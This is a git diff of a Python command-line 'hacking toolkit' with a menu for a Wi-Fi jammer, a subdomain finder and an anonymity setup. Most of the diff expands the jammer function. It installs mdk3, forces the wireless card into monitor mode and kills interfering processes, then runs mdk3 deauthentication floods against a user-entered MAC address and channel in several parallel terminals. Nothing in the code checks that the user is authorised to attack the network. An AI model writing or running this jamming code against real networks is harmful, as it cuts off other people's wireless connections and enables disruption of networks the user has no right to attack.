@@ -1,5 +1,5 @@
-import sys
 import subprocess
+import sys
 import os
 import time
 import requests
@@ -19,7 +19,9 @@ YELLOW = "\033[0;33m"
 
 HYPERLINK = "\033]8;;{url}\033\\{text}\033]8;;\033\\"
 
-init()
+# Initialize colorama
+init(autoreset=True)
+
 
 def display_welcome_message():
     print(f"{Fore.CYAN}------------------------------------------------{Style.RESET_ALL}")
@@ -34,12 +36,13 @@ def display_welcome_message():
 def show_all_commands():
     print(f"  {Fore.GREEN}1: wifi{Style.RESET_ALL}   - Show Wi-Fi related commands")
     print(f"  {Fore.GREEN}2: subdomainfinder{Style.RESET_ALL}   - Sub-Domain Finder")
+    print(f"  {Fore.GREEN}3: fullano{Style.RESET_ALL} - Complete Anonymous ")
     print(f"  {Fore.GREEN}exit{Style.RESET_ALL}   - Exit the tool")
 
 def show_wifi_commands():
     print(f"  {Fore.RED} If Use This You Requires SUPER USER ")
-    print(f"  {Fore.GREEN}wifi_jammer{Style.RESET_ALL}   - Wifi Jammer ")
-    print(f"  {Fore.GREEN}fullano{Style.RESET_ALL} - Complete Anonymous ")
+    print(f"  {Fore.GREEN}w1: wifi_jammer{Style.RESET_ALL}   - Wifi Jammer ")
+    print(f"  {Fore.GREEN}w2: wifi")
     print(f"  {Fore.GREEN}exit{Style.RESET_ALL}   - Exit the tool")
 
 def process_command(cmd):
@@ -47,9 +50,9 @@ def process_command(cmd):
     
     if cmd == 'iam':
         intro_text = f"""
-    {Fore.CYAN}Hi, I'm Kushal Pipalya, a {Fore.GREEN}cybersecurity enthusiast{Fore.CYAN} and {Fore.YELLOW}developer.{Style.RESET_ALL}
-    {Fore.CYAN}I specialize in creating {Fore.MAGENTA}command-line tools{Fore.CYAN} and exploring {Fore.RED}cybersecurity concepts.{Style.RESET_ALL}
-    {Fore.CYAN}Feel free to ask me about various tools and techniques.{Style.RESET_ALL}
+{Fore.CYAN}Hi, I'm Kushal Pipalya, a {Fore.GREEN}cybersecurity enthusiast{Fore.CYAN} and {Fore.YELLOW}developer.{Style.RESET_ALL}
+{Fore.CYAN}I specialize in creating {Fore.MAGENTA}command-line tools{Fore.CYAN} and exploring {Fore.RED}cybersecurity concepts.{Style.RESET_ALL}
+{Fore.CYAN}Feel free to ask me about various tools and techniques.{Style.RESET_ALL}
         """
         typing_speed = 0.05
 
@@ -68,19 +71,19 @@ def process_command(cmd):
     elif cmd in ['1', 'wifi']:
         show_wifi_commands()
         print('-----------------------------------------------------')
-        
-    elif cmd == 'wifi_jammer':
-        print(f"  {Fore.LIGHTMAGENTA_EX} Running Wi-Fi jammer script...! {Style.RESET_ALL}")
-        run_wifi_jammer()
-        
+         
     elif cmd in ['2', 'subdomainfinder']:
         print(f"  {Fore.LIGHTMAGENTA_EX} Running Sub Domain Finder...! {Style.RESET_ALL}")
         subdomainfinder()
         
-    elif cmd == 'fullano':
+    elif cmd in ['3', 'fullano']:
         print(f"  {Fore.LIGHTMAGENTA_EX} Running Full Anonymous setup...! {Style.RESET_ALL}")
         run_fullAnonymous()
 
+    elif cmd in ['w1', 'wifi_jammer']:
+        print(f"  {Fore.LIGHTMAGENTA_EX} Running Wi-Fi jammer script...! {Style.RESET_ALL}")
+        run_wifi_jammer()
+            
     elif cmd in ['clear', 'clr']:
         os.system('cls' if os.name == 'nt' else 'clear')
         
@@ -93,98 +96,145 @@ def process_command(cmd):
         sys.exit()
     else:
         print(f"  {Fore.RED} Unknown command try again..! {Style.RESET_ALL}")
+        
+# -----------------------------------------------------------------------------------------------------------------------------
+
+
+def signal_handler(sig, frame):
+    print(f'{Fore.RED}Process interrupted by user (Ctrl+C). Exiting...{Style.RESET_ALL}')
+    sys.exit(1)
+
+def signal_handler_tstp(sig, frame):
+    print(f'{Fore.RED}Process paused by user (Ctrl+Z).{Style.RESET_ALL}')
+
+# Register signal handlers
+signal.signal(signal.SIGINT, signal_handler)
+signal.signal(signal.SIGTSTP, signal_handler_tstp)
 
 def run_wifi_jammer():
     try:
         def check_and_install_mdk3():
-            print("Checking for mdk3...")
-            result = subprocess.run(['command', '-v', 'mdk3'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            if result.returncode != 0:
-                print('mdk3 is not installed.')
-                install = input('Do you want to install mdk3? (yes/no): ').strip().lower()
-                if install in ['yes', 'y']:
-                    print('Updating and upgrading system...')
-                    subprocess.run(['sudo', 'apt-get', 'update'], check=True)
-                    subprocess.run(['sudo', 'apt-get', 'upgrade', '-y'], check=True)
-                    print('Installing mdk3...')
-                    subprocess.run(['sudo', 'apt-get', 'install', '-y', 'mdk3'], check=True)
-                    # Check the installed version
-                    result = subprocess.run(['mdk3', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    if result.returncode == 0:
-                        print(f"mdk3 version: {result.stdout.decode().strip()}")
+            print(f'{Fore.YELLOW}Checking for mdk3...{Style.RESET_ALL}')
+            try:
+                result = subprocess.run(['which', 'mdk3'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                if result.returncode != 0 or not result.stdout.strip():
+                    print(f'{Fore.RED}mdk3 is not installed.{Style.RESET_ALL}')
+                    install = input(f'{Fore.YELLOW}Do you want to install mdk3? (yes/no): {Style.RESET_ALL}').strip().lower()
+                    if install in ['yes', 'y']:
+                        print(f'{Fore.YELLOW}Updating and upgrading system...{Style.RESET_ALL}')
+                        subprocess.run(['sudo', 'apt-get', 'update'], check=True)
+                        subprocess.run(['sudo', 'apt-get', 'upgrade', '-y'], check=True)
+                        print(f'{Fore.YELLOW}Installing mdk3...{Style.RESET_ALL}')
+                        subprocess.run(['sudo', 'apt-get', 'install', '-y', 'mdk3'], check=True)
+                        result = subprocess.run(['mdk3', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                        if result.returncode == 0:
+                            print(f'{Fore.GREEN}mdk3 version: {result.stdout.decode().strip()}{Style.RESET_ALL}')
+                        else:
+                            print(f'{Fore.RED}Failed to check mdk3 version.{Style.RESET_ALL}')
                     else:
-                        print("Failed to check mdk3 version.")
+                        print(f'{Fore.RED}Exiting as mdk3 is required.{Style.RESET_ALL}')
+                        sys.exit(1)
                 else:
-                    print("Exiting as mdk3 is required.")
-                    sys.exit(1)
-            else:
-                print('mdk3 is already installed.')
+                    print(f'{Fore.GREEN}mdk3 is already installed.{Style.RESET_ALL}')
+            except subprocess.CalledProcessError as e:
+                print(f'{Fore.RED}Error checking or installing mdk3: {e}{Style.RESET_ALL}')
 
         def get_network_interface():
-        
-            print('Displaying network interfaces...')
-            subprocess.run(['ifconfig'], check=True)
+            print(f'{Fore.GREEN}Displaying network interfaces...{Style.RESET_ALL}')
+            subprocess.run(['iwconfig'], check=True)
             
-            interface = input('Enter the network interface to use (e.g., wlan0): ').strip()
-            # Basic validation for interface name
+            interface = input(f'{Fore.GREEN}Enter the network interface to use (e.g., wlan0): {Style.RESET_ALL}').strip()
+            
             if not interface:
-                print("Invalid interface name.")
+                print(f'{Fore.RED}Invalid interface name.{Style.RESET_ALL}')
                 sys.exit(1)
+
+            def is_monitor_mode(interface):
+                result = subprocess.run(['iwconfig', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                if result.returncode == 0:
+                    output = result.stdout.decode()
+                    if 'Mode:Monitor' in output:
+                        return True
+                return False
+
+            def set_monitor_mode(interface):
+                print(f'{Fore.YELLOW}Switching {interface} to monitor mode...{Style.RESET_ALL}')
+                try:
+                    subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True)
+                    subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], check=True)
+                    subprocess.run(['sudo', 'airmon-ng', 'start', interface], check=True)
+                    subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True)
+                    print(f'{Fore.GREEN}{interface} is now in monitor mode.{Style.RESET_ALL}')
+                except subprocess.CalledProcessError as e:
+                    print(f'{Fore.RED}Error setting monitor mode: {e}{Style.RESET_ALL}')
+                    sys.exit(1)
+
+            if not is_monitor_mode(interface):
+                set_monitor_mode(interface)
+            
             return interface
 
         def run_wifi_tools(interface):
-            
-            # Start airmon-ng
-            print(f'Starting airmon-ng on {interface}...')
+            print(f'{Fore.YELLOW}Starting airmon-ng on {interface}...{Style.RESET_ALL}')
             subprocess.run(['sudo', 'airmon-ng', 'start', interface], check=True)
-
-            # Display updated network interfaces
-            print('Displaying updated network interfaces...')
+            print(f'{Fore.GREEN}Displaying updated network interfaces...{Style.RESET_ALL}')
             subprocess.run(['ifconfig'], check=True)
-            
-            # Start airodump-ng
-            print(f'Starting airodump-ng on {interface}...')
-            subprocess.Popen(['sudo', 'airodump-ng', interface])
+            print(f'{Fore.YELLOW}Opening airodump-ng in a new terminal window...{Style.RESET_ALL}')
+            subprocess.Popen(['xterm', '-e', f'sudo airodump-ng {interface}; exec bash'])
 
         def handle_blacklist_whitelist():
             while True:
-                # Remove file if it already exists
-                if subprocess.run(['test', '-f', 'e.lst'], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
-                    subprocess.run(['rm', 'e.lst'])
-                
-                # Prompt user for MAC address
-                macid = input('Enter a MAC address: ').strip()
+                macid = input(f'{Fore.GREEN}Enter a target MAC address: {Style.RESET_ALL}').strip().upper()
                 if not macid:
-                    print("Invalid MAC address.")
+                    print(f'{Fore.RED}Invalid MAC address.{Style.RESET_ALL}')
                     continue
-                
-                # Convert MAC address to uppercase
-                macid = macid.upper()
-                
-                # Create a new file with the MAC address
-                with open('e.lst', 'w') as file:
-                    file.write(macid + '\n')
-                
-                # Run mdk3 with the provided options
-                print('Starting mdk3 with the provided options...')
-                subprocess.run(['sudo', 'mdk3', 'wlan0', 'd', '-c', '1', '-b', 'e.lst'], check=True)
-                
-                cont = input('Do you want to enter another MAC address? (yes/no): ').strip().lower()
+
+                ch = input(f'{Fore.GREEN}Enter Target Channel (CH): {Style.RESET_ALL}').strip()
+                while not ch.isdigit():
+                    print(f'{Fore.RED}Invalid channel. Please enter a numeric value.{Style.RESET_ALL}')
+                    ch = input(f'{Fore.GREEN}Enter Target Channel (CH): {Style.RESET_ALL}').strip()
+
+                try:
+                    num_terminals = int(input(f'{Fore.GREEN}Enter the number of terminals you want to open: {Style.RESET_ALL}').strip())
+                    if num_terminals <= 0:
+                        raise ValueError
+                except ValueError:
+                    print(f'{Fore.RED}Invalid input. Please enter a positive integer.{Style.RESET_ALL}')
+                    continue
+
+                print(f'{Fore.YELLOW}Starting mdk3 in {num_terminals} different terminals...{Style.RESET_ALL}')
+
+                commands = [
+                    ['xterm', '-e', f'sudo mdk3 wlan0 d -c {ch} {macid}; exec bash']
+                    for _ in range(num_terminals)
+                ]
+
+                for cmd in commands:
+                    subprocess.Popen(cmd)
+
+                cont = input(f'{Fore.GREEN}Do you want to enter another MAC address? (yes/no): {Style.RESET_ALL}').strip().lower()
                 if cont not in ['yes', 'y']:
                     break
 
         def runw():
             try:
+                if os.geteuid() != 0:
+                    print(f'{Fore.RED}This script must be run as root. Exiting...{Style.RESET_ALL}')
+                    sys.exit(1)
                 check_and_install_mdk3()
                 interface = get_network_interface()
                 run_wifi_tools(interface)
                 handle_blacklist_whitelist()
             except subprocess.CalledProcessError as e:
-                print(f"Error running Wi-Fi tool commands: {e}")
+                print(f'{Fore.RED}Error running Wi-Fi tool commands: {e}{Style.RESET_ALL}')
 
-    except subprocess.CalledProcessError as e:
-        print(f"Error running Wi-Fi jammer script: {e}")
+        runw()
+
+    except KeyboardInterrupt:
+        print(f'{Fore.RED}Process interrupted by user Exiting...{Style.RESET_ALL}')
+        sys.exit(1)
+
+# ----------------------------------------------------------------------------------------------------------------------------------
 
 def run_fullAnonymous():
     choice = input('Do you want to execute the script? Enter (1) or show the steps? Enter (2): ')
@@ -261,6 +311,8 @@ def run_fullAnonymous():
         print(f"{Fore.CYAN}------------------------------------------------{Style.RESET_ALL}")
     else:
         print('Invalid choice. Please enter 1 or 2.')
+ 
+# ----------------------------------------------------------------------------------------------------------------------------------
         
 def subdomainfinder():
     
@@ -420,7 +472,6 @@ def subdomainfinder():
 
         if __name__ == "__main__":
             run()
-
 
 
 def main():
